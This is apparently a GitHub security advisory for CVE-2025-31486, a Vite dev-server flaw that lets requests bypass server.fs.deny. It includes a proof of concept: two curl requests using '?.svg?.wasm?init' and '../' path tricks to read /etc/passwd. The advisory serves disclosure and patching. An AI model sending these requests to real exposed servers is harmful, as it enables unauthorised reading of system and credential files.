# [M] Vite allows server.fs.deny to be bypassed with .svg or relative paths

## Summary
Severity: Medium
Advisory: GHSA-xcj6-pq6g-qj4x
CVE: CVE-2025-31486
CWE: CWE-200, CWE-284
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-04-04
Source: https://github.com/advisories/GHSA-xcj6-pq6g-qj4x
Type: github-advisory

## Affected
- npm: `vite` — affected >=6.2.0 <6.2.5
- npm: `vite` — affected >=6.1.0 <6.1.4
- npm: `vite` — affected >=6.0.0 <6.0.14
- npm: `vite` — affected >=5.0.0 <5.4.17
- npm: `vite` — affected >=0 <4.5.12

## Details
### Summary

The contents of arbitrary files can be returned to the browser.

### Impact

Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details

#### `.svg`

Requests ending with `.svg` are loaded at this line.
https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290
By adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.

This bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.

#### relative paths

The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).

### PoC

```bash
npm create vite@latest
cd vite-project/
npm install
npm run dev
```

send request to read `etc/passwd`

```bash
curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
```

```bash
curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw'
```

## References
- https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x
- https://nvd.nist.gov/vuln/detail/CVE-2025-31486
- https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647
- https://github.com/vitejs/vite
- https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290
